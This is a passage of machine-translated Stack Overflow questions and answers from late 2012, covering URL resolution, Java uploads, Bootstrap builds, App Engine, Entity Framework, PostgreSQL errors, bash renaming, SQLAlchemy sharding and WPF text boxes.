*浏览器*的工作是将相对 URL “/”解析为绝对 URL “http://www.example.com”。搜索引擎索引机器人也是如此。所有缓存都基于绝对 URL，因此也没有区别。

实际的区别是，如果将页面移动到另一台服务器，则可以保留相对 URL，而需要更改绝对 URL。

为了说明为什么差异无关紧要，请考虑存在差异的情况：`href="/"`与`href="/index.html"`. 即使它们可能指向同一个页面，解析的绝对 URL 也是不同的字符串。在缓存中它们将被视为不同，搜索引擎会将它们视为不同，即使它们可能会发现内容相同（特别是如果其中一个被 HTTP 重定向到另一个）。但重要的是绝对 URL 之间的区别，而不是绝对 URL 与相对 URL。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:37:38.733

在我看来，绝对更好，但这是主观的。

它不会因此变慢，DNS条目无论如何都会被缓存......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T23:31:39.797

正如 Zak 所说，谷歌和其他搜索引擎会看到相对链接，因此没有缺点。但是，绝对路径有一个缺点。

例如，如果您要链接到绝对地址，例如：

```
 `<a href="http://www.example.com/pages/page1.html">` 
```

如果你要移动 pages 文件夹并且你有一个相对地址，一切都会好起来的，但是如果你移动它并且那是一个绝对地址，它就会中断。

前任： `<a href="http://www.example.com/webpages/pages/page1.html">`

原始链接现在将被破坏，但相对链接不会。（对于移动文件夹内的链接）

# java - 如何使用 StringBody 通过 HttpMime 上传文件？

> ID：13167774
> 
> 赞同：1
> 
> 时间：2012-10-31T21:33:51.893
> 
> 标签：java, groovy, apache-commons

```
def params = new MultipartEntity();

params.addPart("name", new StringBody(fileName))
params.addPart("file", new StringBody(fileContent))
post.setEntity(params)

def response = httpclient.execute(post) 
```

此代码不起作用。

```
def fileContent = new FileBody(new File(fileName))
def params = new MultipartEntity();

params.addPart("name", new StringBody(fileName))
params.addPart("file", fileContent)
post.setEntity(params) 
```

这段代码可以。

它中断是因为我从要发布到的 Tomcat 服务器收到 400 Bad Request。我不知道为什么会这样说，这是我无法控制的应用程序。

我不想将临时文件写入硬盘。我现在不清楚如何避免这种情况。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:42:26.647

我认为您可能希望使用 name as`body`代替`file`as：

```
 params.addPart("body", new StringBody(fileContent)); 
```

# node.js - 当我尝试构建 Twitter Bootstrap 时，为什么“make test”对我来说失败了？我安装了连接，但我收到“错误：找不到模块‘连接’”

> ID：13167775
> 
> 赞同：1
> 
> 时间：2012-10-31T21:33:52.580
> 
> 标签：node.js, twitter-bootstrap, npm

所以我用 git 来克隆 Twitter Bootstrap。然后我得到了 node.js 和 npm，因为我按照这里的说明进行操作：[https](https://github.com/twbs/bootstrap) ://github.com/twbs/bootstrap 然后我运行了命令`npm install recess connect uglify-js jshint -g`。然后我还以相同的方式安装了 phantomjs（首先没有`-g`标志，然后有它）。现在我应该能够运行`make`然后`make test`。 `make`对我来说工作得很好，但`make test`抛出以下错误：

```
jshint js/*.js --config js/.jshintrc
jshint js/tests/unit/*.js --config js/.jshintrc
node js/tests/server.js &
phantomjs js/tests/phantom.js "http://localhost:3000/js/tests"
module.js:340
    throw err;
          ^
Error: Cannot find module 'connect'
    at Function.Module._resolveFilename (module.js:338:15)
    at Function.Module._load (module.js:280:25)
    at Module.require (module.js:362:17)
    at require (module.js:378:17)
    at Object.<anonymous> (/Users/Jon/dev/blossom/bootstrap/js/tests/server.js:6:15)
    at Module._compile (module.js:449:26)
    at Object.Module._extensions..js (module.js:467:10)
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
    at Module.runMain (module.js:492:10)
Unable to access network
kill -9 `cat js/tests/pid.txt`
cat: js/tests/pid.txt: No such file or directory
kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec]
make: *** [test] Error 1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-30T13:19:09.910

有点晚了，但为了记录：

运行`nmp install`没有`-g`开关的线路。该`-g`开关告诉 npm 全局安装，并且在运行应用程序时，模块加载器不会拾取全局安装的模块。全局安装模块是为了访问模块可能提供的命令（如您在该跟踪中看到的`phantomjs`或）。`jshint`

# google-app-engine - 对于数据长度大于 500 个 Unicode 字符的字段，从 csv 源文件批量上传失败

> ID：13167776
> 
> 赞同：0
> 
> 时间：2012-10-31T21:33:54.000
> 
> 标签：google-app-engine, google-cloud-datastore

我正在使用 appcfg.py 将数据从 csv 源文件批量上传到 appengine。csv 文件中一个字段的数据值长度大于 500 个 Unicode 字符。

执行 appcfg 上传命令会生成以下日志：-

> [信息] 打开数据库：bulkloader-progress-20121101.024343.sql3
> 
> [信息] 连接到 xxxxxxx.appspot.com/remote_api
> 
> [INFO] 开始导入；每个帖子最多 10 个实体
> 
> .
> 
> [INFO ] 共 1 个实体，0 个之前转移
> 
> [INFO] 1 个实体（3590 字节）在 15.5 秒内传输
> 
> [INFO ] 所有实体已成功转移

执行后，appengine 仪表板上的数据存储查看器不会显示长度值大于 500 个 Unicode 字符的字段的值。

我搜索了很多从 csv 源文件批量上传长度值大于 500 个 Unicode 字符的数据，但没有成功。

**编辑1：-**

成立`Text string (long)` `com.google.appengine.api.datastore.Text` `None`

```
Up to 1 megabyte Not indexed 
```

在[https://developers.google.com/appengine/docs/java/datastore/entities](https://developers.google.com/appengine/docs/java/datastore/entities)

但是，不确定如何使用它从 csv 源文件批量上传数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-06T06:16:59.853

500 个字符是字符串字段的限制。除非它们是文本或 blob 字段，否则任何超过 500 的内容都将被截断。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-05T13:53:51.353

`export_transform`在 bulkloader.yaml 文件中使用要转换为 Text 的属性的标记。

从[上传数据](https://developers.google.com/appengine/docs/python/tools/uploadingdata)文档：

> 进口转换
> 
> 基于 external_name 或 import_template 字符串返回正确值和类型数据的单参数函数。示例包括内置的 Python 转换运算符（例如 float）、transform 中提供的几个辅助函数中的任何一个，例如 get_date_time 或 generate_foreign_key、您自己的库中提供的函数或内联 lambda 函数...
> 
> ...
> 
> 出口转换
> 
> 与 import_transform 类似，但在导出时执行。

有了它，您可以设置一个功能，在上传之前将您的数据转换为文本，从而解决您的问题。

# entity-framework - 实体框架更新相关实体

> ID：13167777
> 
> 赞同：0
> 
> 时间：2012-10-31T21:34:02.393
> 
> 标签：entity-framework

尝试更新相关实体时收到错误消息。

当创建一个新的就可以了。

错误消息说：

*发生参照完整性约束冲突：定义参照约束的属性值在关系中的主体对象和从属对象之间不一致。*

**请检查我的代码，并告诉我我做错了什么。**

首先，DB是Mysql MyISAM。

实体类

```
[Table("note")]
public class Note
{
    [Key]
    public int id { get; set; }

    [Required(ErrorMessage="Content is required")]
    [DisplayName("Note")]
    public string content { get; set; }
    public DateTime date { get; set; }

    [Required(ErrorMessage = "User ID is required")]
    [DisplayName("User ID")]
    public string userId {get; set;}
    public Boolean isPrivate { get; set; }

    [DisplayName("Attach File")]
    public virtual ICollection<AttachedFile> AttachedFiles { get; set; }

}

[Table("attachedfile")]
public class AttachedFile
{
    [Key]
    public int id { get; set; }
    public int noteId { get; set; }
    public string fileName { get; set; }
} 
```

控制器，

```
[HttpPost]
public ActionResult Index(Note note, HttpPostedFileBase attFile)
{
    try
    {
    if (ModelState.IsValid)
    {
        updateAttachFile(note, attFile);
        if (note.id > 0)
        {
        unitOfWork.NoteRepository.UpdateNote(note);
        }
        else
        {
        unitOfWork.NoteRepository.InsertNote(note);
        }

        unitOfWork.Save();
        return RedirectToAction("Index");
    }
    }catch(DataException){
    ModelState.AddModelError("", "Unable to save changes. Try again please");
    }

    var notes = unitOfWork.NoteRepository.GetNotes();
    return View(new NoteViewModel() { noteList = notes.ToList(), note = new Note() });
}

private void updateAttachFile(Note note,HttpPostedFileBase attFile)
{
    if (attFile == null) return;

    List<AttachedFile> list;
    if (note.id > 0)
    {
    list = unitOfWork.AttachedFileRepository.Get(filter: q => q.noteId.Equals(note.id)).ToList();
    }
    else
    {
    list = new List<AttachedFile>();
    }

    var fileName = Path.GetFileName(attFile.FileName);
    fileName = fileName.Replace(" ", "");
    fileName = Regex.Replace(fileName, @"\s|\$|\#\%", "");
    var path = Path.Combine(Server.MapPath("~/App_data/uploads"), fileName);
    attFile.SaveAs(path);

    list.Add(new AttachedFile
    {
    fileName = fileName
    });

    note.AttachedFiles = list;
}
} 
```

![在此处输入图像描述](../Images/3b4c83e029dbe5f1bfadbf83f07f821c.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T23:37:01.973

通过将状态设置`note`为`Modified`EF 会将相关实体，尤其是新创建的实体，也附加`AttachedFile`到上下文中，但处于状态`Unchanged`。但是，您还没有设置正确的外键属性值（如果实体不在 state 中，这是必要的`Added`）。这样做会消除异常：

```
list.Add(new AttachedFile
{
    noteId = note.id,
    fileName = fileName
}); 
```

但是您的新`AttachedFile`数据不会添加到您的数据库中，因为它不在`Added`状态。

`updateAttachFile`如果您在更新/插入之后调用，我希望这是可行的...

```
if (note.id > 0)
    unitOfWork.NoteRepository.UpdateNote(note);
else
    unitOfWork.NoteRepository.InsertNote(note);
updateAttachFile(note, attFile);
unitOfWork.Save(); 
```

...因为发生的变化检测`SaveChanges`将识别新实体并自动将其置于`Added`状态。

作为旁注：我不知道您为什么将现有的 AttachedFiles 加载到`unitOfWork.AttachedFileRepository.Get...`. `list`在我看来，对于更新和插入两种情况，它都应该是空的。

# sql - 插入/更新后将错误返回给用户

> ID：13167778
> 
> 赞同：0
> 
> 时间：2012-10-31T21:34:04.007
> 
> 标签：sql, perl, postgresql

我正在尝试找到一种将错误消息从 postgresql 返回到我的客户端应用程序的好方法。我读过关于 RAISE 的文章，这似乎是我想要的，但我有几个问题。使用 Postgresql 9.1。

对正在发生的事情的概述，我从客户端接收一个 JSON 对象，将 JSON 解析为 Perl 哈希，遍历键并在每次迭代时执行更新/插入。哈希键与我的数据库表名相关。

我有 3 个这样的 sql 函数（同名）。一个接受文本、带时区的时间戳和一个整数。（来自[https://stackoverflow.com/a/6527838/722238](https://stackoverflow.com/a/6527838/722238)的查询）

```
-- $1 = Table Key, $2 = Table Value, $3 = Table Name.
create function ex.foo(integer,text,text) Arg2 could be timestamp,text,or integer.  
    returns void as $$
    begin
    execute format('update %3$s set v= %2$L where k = %1$L;
                insert into %3$s (k,v) select %1$s, %2$L 
                  where not exists (select 1 from %3$s where k = %1$L)', $1,$2,$3);
    -- RAISE a descriptive error. 
    return;
    end;
$$ language 'plpgsql'; 
```

目前，我正在这样做（伪代码）：

```
if (Begin) {
    eval {
        my $tk = 123;
        foreach my $k (keys %js) {
            ## tk = table key, $k = table name, $js{$k} = value 
            executeq("select ex.foo(tk,$js{$k},$k);") or die error(pgError); # Function to handle error?
         }
         Commit;
     };
     if ($@) {
         RollBack;
         ## Return $@ 
     }
} 
```

我的问题是，我不确定我应该如何生成描述性错误（在哪里/为什么），将其返回到链上并以用户可以理解的语言返回。同样，我应该如何引发错误，并且应该将它传递给错误处理函数？标准是什么？其他人如何做到这一点？

此外，在循环遍历我的哈希和插入/更新这样的值时，我可能会遇到问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:58:03.163

Use the [Try::Tiny](https://metacpan.org/module/Try%3a%3aTiny) module. It gives you the more readable try/catch syntax, and also avoids a couple of potential gotchas involved with using eval.

To handle the error, either do that in the catch block (or the 'if ($@)' block in your current code), or call a separate error handling function from that block.

# javascript - 我如何 goo.gl-缩短 js 中的 url？

> ID：13167788
> 
> 赞同：6
> 
> 时间：2012-10-31T21:34:46.923
> 
> 标签：javascript, goo.gl, google-client

[先决条件：在https://code.google.com/apis/console/](https://code.google.com/apis/console/)为自己创建一个 urlshortener 的 API 密钥

有很多关于通过 js [get](https://developers.google.com/url-shortener/v1/url/get) api 将 goo.gl url 转换为原始 URL 的各种方法的文档，例如：[here](https://code.google.com/p/google-api-javascript-client/source/browse/samples/requestSample.html)、[here](http://code.google.com/p/google-api-javascript-client/wiki/Samples)和[here——](http://code.google.com/p/google-api-javascript-client/source/detail?r=6a9fc147aeec1bd2df82abb2654b08d8ba96f430)至少第一个甚至可以工作。

如果我稍微调整一下以使用[插入](https://developers.google.com/url-shortener/v1/url/insert)api 将 url 转换*为*小 url，但是传递 a `{ "longUrl": "https://codepen.io/" }`，它会中断。[如果您愿意，可以在http://codepen.io/johan/full/EHbGy#YOUR-API-KEY-HERE](http://codepen.io/johan/full/EHbGy#YOUR-API-KEY-HERE)试试，或者在某处运行：

```
<script>
var api_key = 'YOUR-API-KEY-HERE';

function makeRequest() {
  var request = gapi.client.urlshortener.url.insert({
    'longUrl': 'https://codepen.io/'
  });
  request.execute(function(response) {
    alert(JSON.stringify(window.got = response));
  });
}

function load() {
  gapi.client.setApiKey(api_key);
  gapi.client.load('urlshortener', 'v1', makeRequest);
}
</script>
<script src="https://apis.google.com/js/client.js?onload=load"></script> 
```

...它只是响应错误：

```
{ "code": 400
, "message": "Required"
, "data": 
  [ { "domain": "global"
    , "reason": "required"
    , "message": "Required"
    , "locationType": "parameter"
    , "location": "resource.longUrl"
    }
  ]
, "error": 
  { "code": 400
  , "message": "Required"
  , "data": 
    [ { "domain": "global"
      , "reason": "required"
      , "message": "Required"
      , "locationType": "parameter"
      , "location": "resource.longUrl"
      }
    ]
  }
} 
```

建议？`url.insert`（不，如果您将参数更改为带有`resource.longUrl`键的对象 - 或者只是在没有包装对象的情况下传递 url ，它不会更好。）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-31T22:00:10.100

在文档或错误消息中不是很清楚，但是您的请求应该如下所示，一切都会好起来的：

```
var request = gapi.client.urlshortener.url.insert({
    'resource': {'longUrl': 'https://codepen.io/'}
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T22:09:28.340

我想我会为此放弃凌乱的客户端库，事实证明我可以用五行 coffescript 来完成，而不是加载所有那些杂乱无章的东西，因为无论如何我已经有了 jQuery：http: [//codepen.io/johan/笔/puJyH](http://codepen.io/johan/pen/puJyH)

```
api = 'https://www.googleapis.com/urlshortener/v1/url'
api += "?key=#{key}"  if key = location.search.slice 1

$.ajax
  url: api
  type: 'POST'
  data: JSON.stringify(longUrl: url)
  contentType: 'application/json'
  success: (got) ->
    alert "shortened url: #{got.id}" 
```

# expressionengine - 根据嵌入条件填充 preload_replace 变量

> ID：13167791
> 
> 赞同：1
> 
> 时间：2012-10-31T21:35:08.033
> 
> 标签：expressionengine

我喜欢为我构建的页面（供 Facebook、Google 和其他服务使用）填充`thumbnail`和元标记，并试图简化我的方法。`og:image`

我希望在显示没有特定图像资产的页面时指定一个通用的站点范围的图像，同时能够在有保证的情况下指定一个特定的图像（通过`embed`变量传递）。

这是我的方法：

```
{embed="_global/_header" thumbnail="http://mysite.com/images/articles/some-image.jpg"} 
```

然后在`_header`：

```
{if embed:thumbnail}{preload_replace:thumbnail="{embed:thumbnail}"}{/if}
{preload_replace:thumbnail="{site_url}/assets/img/thumbnail.jpg"}

...

<meta name="og:image" content="{thumbnail}" />
<meta name="thumbnail" content="{thumbnail}" /> 
```

当我通过 传递缩略图 URL 时，这很有效`embed`（因为使用了为`preload_replace`变量设置的第一个值，随后的值被忽略），但是当我*不*传递值时，`{thumbnail}`最终为空（而不是使用我分配的`{site_url}/assets/img/thumbnail.jpg`值）。

任何人都可以在这里看到我的方法中的错误吗？`{thumbnail}`当我没有传递那个嵌入变量时，为什么会在我的条件（最终为空）中被解析？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-01T16:16:16.080

当我在 EE2.5.3 中尝试时，以下工作：

```
{if embed:thumbnail == ''}{preload_replace:thumb="/assets/img/thumbnail.jpg"}{/if}
{if embed:thumbnail != ''}{preload_replace:thumb="{embed:thumbnail}"}{/if} 
```

如果我颠倒顺序，它就不起作用，我会得到你报告的行为 - 如果有嵌入参数很好，否则为空。

至于这个订单的确切原因，我不知道——也许像许多 EE 怪癖一样解析订单相关。希望其他人可以解释它为什么起作用，我们都可以学习:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:50:48.907

您可能想尝试像这样编写条件，以避免奇怪的 EE 解析顺序问题：

```
{if "{embed:thumbnail}" == ""}
    {preload_replace:thumbnail="{embed:thumbnail}"}
{/if} 
```

另外，我不太熟悉`preload_replace`，但是您可以使用[Stash](https://github.com/croxton/Stash)解决这个问题吗？它还有一个额外的优势，即您可以在页面模板的下方设置缩略图（例如，从您的频道内容中动态设置它）。

在您的页面模板中：

```
{embed="_global/_header"}
{exp:stash:set name="thumbnail"}http://mysite.com/images/articles/some-image.jpg{/exp:stash:set} 
```

在您的标题嵌入中：

```
{!-- set the default thumbnail --}
{exp:stash:set name="thumbnail" replace="no"}http://mysite.com/images/default.jpg{/exp:stash:set}
<meta name="og:image" content='{exp:stash:get name="thumbnail"}' />
<meta name="thumbnail" content='{exp:stash:get name="thumbnail"}' /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-01T11:17:31.210

我采用了与 Adrian 对元数据建议的方法相同的方法，它也适用于您的缩略图 - 认为这通常是一种完全不同的思考模板的方式。我在较早的 Stack Exchange 回答中描述了该方法，该答案是关于在[此处不需要多个条目循环](https://stackoverflow.com/questions/6190318/how-to-automatically-show-title-of-the-entries-articles-in-the-browser-title-bar/13019756#13019756)的情况下使用条目数据填充页面标签的问题。

当我将存储用于元数据时，我将有效地执行您想要对缩略图执行的相同操作 - 当条目特定数据未输入/不可用时，有条件地回退到默认值。我在入门级别运行该条件，然后 stash:set 结果。然后在元标题中——这是我的嵌入式布局包装模板的一部分——我使用 stash:get 来检索隐藏的结果。几乎任何您想在解析顺序中的某一点设置并在解析顺序中稍后获得的数据都可以完成同样的事情 - 无论它出现在包装模板中的什么位置，因为作为嵌入（通常是您唯一会在存储设置中使用）它的解析时间比您的条目循环逻辑晚。

# c - 使用带有套接字连接的 libpcap

> ID：13167792
> 
> 赞同：1
> 
> 时间：2012-10-31T21:35:10.817
> 
> 标签：c, sockets, network-programming, freebsd

是否可以使用 libpcap 来检测传入连接，并动态创建一个套接字来接受该连接，或者当 libpcap 嗅探数据包时为时已晚？我之所以问，是因为我只想为特定会话打开套接字连接，而不是为任何通过网络连接的旧连接打开。因此，我没有一个已经绑定并监听接口的套接字。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-01T00:42:13.123

打开侦听套接字并关闭所有不是来自所需对等方的传入连接会简单得多。您完全可以在不使用 libpcap 的情况下完成所有这些工作。

# bash - 将反引号或 $() 与 xargs 和 sed 或 awk 一起使用

> ID：13167794
> 
> 赞同：5
> 
> 时间：2012-10-31T21:35:15.283
> 
> 标签：bash, sed, awk, xargs

假设我想将一些`jpg.jpg`以结尾的文件名更改为仅以`.jpg`（在 bash 中）结尾，并且我想通过管道输出`find`to来做到这一点`xargs`：

通过使用`sed`：

```
find . -iname '*jpg.jpg' | xargs -I % mv -iv % $(echo % | sed 's/jpg.jpg/.jpg/g') 
```

但是，这不会`jpg.jpg`替换`.jpg`.`mv`

通过使用`awk`：

```
find . -iname '*jpg.jpg' | xargs -I % mv -iv % $(echo % | awk '{gsub(/jpg.jpg/,".jpg")}; 1') 
```

这也没有任何替代。我错过了什么吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-31T22:00:47.373

我会通过编写一个接受文件名并进行重命名的脚本来做到这一点：

```
#!/bin/sh

for FILE
do
    mv $FILE `basename $FILE jpg.jpg`.jpg
done 
```

该脚本很容易通过`xargs`.

如果您想将它粉碎到单个命令行上，您可以这样做，但通常不值得麻烦。

编辑：如果我必须在一个命令行上执行此操作，我可能会使用不同的技巧`xargs`：使用`sed`将输出`find`转换为 shell 脚本：

```
find . -iname '*jpg.jpg' | sed -e 's/\(.*\)jpg\.jpg$/mv & \1.jpg/' | sh 
```

`xargs`能够分出更少孩子的优势被`mv`无论如何都需要反复跑步所击败。如果你真的需要*这个*优势，你需要一个像我的第一个选项这样的解决方案，但编码为`perl`可以执行多个`rename()`调用而无需分叉任何`mv`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-31T21:39:48.687

如果您的`rename`系统上有可用的命令，那么以下命令应该可以工作：

```
rename 's/(.*)jpg.jpg/$1.jpg/g' *jpg.jpg 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-31T21:40:10.507

在`$(...)`运行 xargs 之前由 bash 评估，所以 xargs 只看到该表达式的输出，因为它当前是 mv 的第二个参数。

所以它相当于：

```
... | xargs -I % mv % % 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-31T22:33:48.400

我会为此使用 GNU 并行：

```
find . -iname '*jpg.jpg' | parallel mv {} {.} 
```

`{}`替换为输入，`{.}`替换为输入减去最后一个扩展名。与 parallel 一起使用`--dry-run`以查看将要执行的操作。

### 编辑 - 应该处理 file1jpg.jpg

根据您在保持大小写方面的需要，这可以通过参数扩展或使用 GNU sed 来完成：

参数扩展：

```
find . -iname '*jpg.jpg' | parallel v={}\; mv '{}' '${v/jpg.jpg/.jpg}' 
```

使用 GNU sed：

```
find . -iname '*jpg.jpg' | parallel mv '{}' '$(echo {} | sed -r "s/jpg\\.(jpg)$/.\1/I")' 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-31T21:55:30.677

不需要`xargs`or `find`：

```
for i in *jpg.jpg; do mv "$i" "$(echo $i | sed 's/jpg.jpg$/.jpg/')"; done 
```

并且没有真正需要`sed`或`awk`两者之一：

```
for i in $(find . -type f -name "*jpg.jpg"); do mv "$i" "${i/%jpg.jpg/.jpg}"; done 
```

这是另一种方式：

```
find . -type f -name "*jpg.jpg" -exec bash -c 'mv $0 ${0/%jpg.jpg/.jpg}' {} \; 
```

# database - SQLAlchemy、UUID、Sharding 和 AUTO_INCREMENT 主键......如何让它们一起工作？

> ID：13167799
> 
> 赞同：5
> 
> 时间：2012-10-31T21:35:39.553
> 
> 标签：database, performance, sqlalchemy, uuid, sharding

我有一个关于 SQLAlchemy、数据库分片和 UUID 的问题，请教各位。

我目前正在使用 MySQL，其中有一个表格：

```
CREATE TABLE foo (
    added_id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    id BINARY(16) NOT NULL,
    ... other stuff ...
    UNIQUE KEY(id)
); 
```

这张桌子的一点背景。我从不关心“added_id”，我只是用来确保插入的项目在磁盘上聚集在一起（因为在 MySQL 中用于索引表的 B-Tree 使用主键作为集群索引）。“id”列包含 UUID 的二进制表示——这是我真正关心的列，所有其他事物都引用此 ID。同样，我不希望 UUID 成为主键，因为 UUID 是随机的，因此为索引表创建的 B-Tree 具有可怕的 IO 特征（至少这是其他地方所说的）。此外，虽然 UUID1 包含时间戳以确保以“顺序”顺​​序生成 ID，但在 ID 中包含 MAC 地址使我宁愿避免这种情况。因此，我想使用 UUID4s。

好的，现在转到 SQLAlchemy 部分。在 SQLAlchemy 中，可以通过执行以下操作使用他们的 ORM 为上表定义模型：

```
# The SQL Alchemy ORM base class
Base = declerative_base()

# The model for table 'foo'
class Foo(Base):
    __table__ = 'foo'
    add_id = Column(Integer, primary_key=True, nullable=False)
    id = Column(Binary, index=True, unique=True, nullable=False)
    ... 
```

同样，这与上面的 SQL 基本相同。

现在问题来了。假设这个数据库将被分片（水平分区）到 2 个（或更多）单独的数据库中。现在，（假设没有删除）这些数据库中的每一个都将在表 foo 中具有 added_id 为 1、2、3 等的记录。由于 SQLAlchemy 使用会话来管理正在处理的对象，以便每个对象仅由其主键标识，因此似乎有可能出现这样的情况，即我可以结束尝试从这两个对象中访问两个 Foo 对象具有相同 added_id 的分片会导致托管会话中的一些冲突。

有没有人遇到过这个问题？你做了什么来解决它？或者，很可能，我是否遗漏了 SQLAlchemy 文档中的某些内容，以确保不会发生这种情况。但是，查看 SQLAlchemy 下载（examples/sharding/attribute_shard.py）提供的分片示例，他们似乎通过将一个数据库分片指定为 ID 生成器来回避这个问题...... INSERTS 必须针对该单个数据库来获取 ID。（他们还提到使用 UUID，但显然这会导致索引的性能问题。）

或者，有没有办法将 UUID 设置为主键并使用 added_id 将数据聚集在磁盘上？如果在 MySQL 中不可能，那么在 Postgres 这样的另一个数据库中是否有可能？

提前感谢您的任何和所有输入！

--- 更新 ---- 我只想添加一个我收到的关于这个问题的带外答案。下面的文字不是我写的，我只是想把它放在这里，以防有人觉得它有用。

> 使用 MySQL 和自动增量键避免这种情况的最简单方法是为每个数据库使用不同的自动增量偏移量，例如：
> 
> ALTER TABLE foo AUTO_INCREMENT=100000;
> 
> 不利的一面是，您需要注意如何配置每个分片，并且您需要对所使用的分片总数进行一些计划。
> 
> 没有任何方法可以说服 MySQL 为聚集索引使用非主键。如果您不关心使用 SQLAlchemy 来管理您的数据库架构（尽管您可能应该这样做），您可以简单地将 UUID 设置为 SQLAlchemy 架构中的主键，并将 add_id 保留为实际表中的 pk。
> 
> 我还看到了仅使用外部服务器（例如 redis）来维护行 ID 的替代解决方案。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-06T22:31:29.507

是的，您可以使用“primary_key”映射器参数将表的任何列指定为主键，该参数是列对象列表或单个列：

```
Base = declarative_base()

# The model for table 'foo'
class Foo(Base):
    __table__ = 'foo'
    add_id = Column(Integer, primary_key=True, nullable=False)
    id = Column(Binary, index=True, unique=True, nullable=False)

    __mapper_args__ = {'primary_key': id} 
```

上面，虽然 SQLAlchemy Core 将“add_id”视为“autoincrement”列，但映射器对它几乎不感兴趣，而是在考虑对象的“identity”时使用“id”作为它关心的列。

有关更多描述，请参阅[mapper() 的文档。](http://docs.sqlalchemy.org/en/latest/orm/mapper_config.html?highlight=mapper#sqlalchemy.orm.mapper)

# c# - 将超高 WPF RichTextBox 拆分为多个控件

> ID：13167800
> 
> 赞同：4
> 
> 时间：2012-10-31T21:36:05.597
> 
> 标签：c#, .net, wpf

我正在尝试获取 RichTextBox 的内容高度，如果它超过 500px，则将其拆分为多个最大高度为 500px 的 RichTextBox。

有人知道怎么做吗？谢谢。

编辑：

“拆分”是指将超出高度限制的内容放在另一个 RichTextBox 中，由于项目的特殊性，该解决方案不能仅仅改变当前 RichTextBox 的外观。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T08:58:46.833

我在这个拆分 RichTextBox 问题上玩了一点，这并不容易 ^^ 我的想法是这样的：

*   创建一个将继承**RichTextBox的****SplitRichTextBox** CustomControl （主要是获取所有依赖属性）
***   添加**MaxContentHeight**双依赖属性来管理最大尺寸（在您的情况下为 500px）*   添加一个**Remainders** IList< RichTextBox > 依赖属性，一旦它被拆分，它将成为当前 SplitRichTextBox 的剩余部分。*   自定义 SplitRichTextBox 的 ControlTemplate 以在面板中显示 SplitRichTextBox 内容和其余内容，以满足您的布局需求。*   覆盖 SplitRichTextBox 上的 OnTextChanged 方法。**

 **在此方法中检索底层的richTextBox flowDocument 并检索分页器。设置 MaxPageHeight 并计算文档页面。

```
var flowDocument = this.Document;
flowDocument.MaxPageHeight = this.MaxContentHeight;
DocumentPaginator paginator = ((IDocumentPaginatorSource)flowDocument).DocumentPaginator;
paginator.ComputePageCount(); 
```

由于分页器上的 GetPage(int i) 方法，您现在可以检索每个页面的内容。第一页是您想要的第一个 RichTextBox。剩余页面将用于实例化 Remainders 依赖属性。

问题是页面不是直接的 RTF 或 flowDocument。您将需要以某种方式从分页器/页面中提取数据以了解如何拆分文档。这是我停下来的地方，也许不是要走的路，但我认为值得一试。

祝你好运 ！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-06T10:09:24.847

您是否尝试在 RichTextBox.ContentsResized 事件中使用此代码。

```
Private Sub rtb_ContentsResized(ByVal sender As Object, ByVal e As System.Windows.Forms.ContentsResizedEventArgs) Handles txtQuestion.ContentsResized
    Dim h = e.NewRectangle.Height, w = e.NewRectangle.Width
    h = Math.Max(h, sender.Font.Height)
    h = Math.Min(h, Me.ClientSize.Height - 10 - sender.Top)
    h += sender.Height - sender.ClientSize.Height + 1
    sender.Height = h 
```

结束子

如果有任何替代的 c# 代码，我不知道。

还有附加信息 - Richtextbox 控件是使用 GDI 绘制的，而“Graphics.MeasureString”使用 GDI+ 来测量字符串。因此 'MeasureString' 不会返回字符串的确切大小。我担心您将不得不深入研究 GDI32-API 以获得准确的结果。如果您对使用 Win32 GDI API 调用感兴趣，[请看这里](http://www.tech-archive.net/Archive/DotNet/microsoft.public.dotnet.framework.windowsforms.controls/2004-09/0574.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T07:17:13.727

我想我得到了你的答案。感谢 google 和 stackoverflow。

WPF FlowDocument 只能属于单个 RichTextBox。但是，如果您使用的是可以在 UI 中的不同点进行操作的单个文档，那么不会发生同时显示单个文档的两个 RichTextBox（并且不能，因为 WPF 会抱怨）。但是您使用的是单个文档还是多个文档？如果单身，请阅读其余部分，如果没有，请继续前进。

在这里使用 MemoryStream 和 XamlReader/Writer 将不起作用，因为我们希望保留单个文档并在使用它的任何地方反映更改，因此每次都复制它是不可能的。抄自 stackoverflow 的成员 Jared，

> WPF 控件可以随意“取消父级”和“重新父级”，因此只需使 RichTextBox 实例在整个向导中共享的上下文中可用，并确保在您从一个页面移动到另一个页面时您是取消父级/重新父级。这还具有在向导中跨页面保存对编辑器状态的任何样式或更改的好处（这可能是可取的）。

如果无法跨页面共享 RichTextBox 实例，我认为有一种方法可以解除文档与原始 RichTextBox 的关联。看来，为了解除文档与 RichTextBox1 的关联，您必须为 RichTextBox1 提供一个新文档。您不能将 RichTextBox1.Document 设置为 null，但可以将 RichTextBox1.Document 设置为 new FlowDocument()，我相信这会起作用。

从上面看，FlowDocument 不能被几个 RichTextBox 控件直接共享。所以正如我上面评论的那样，使用网格

```
<Grid>
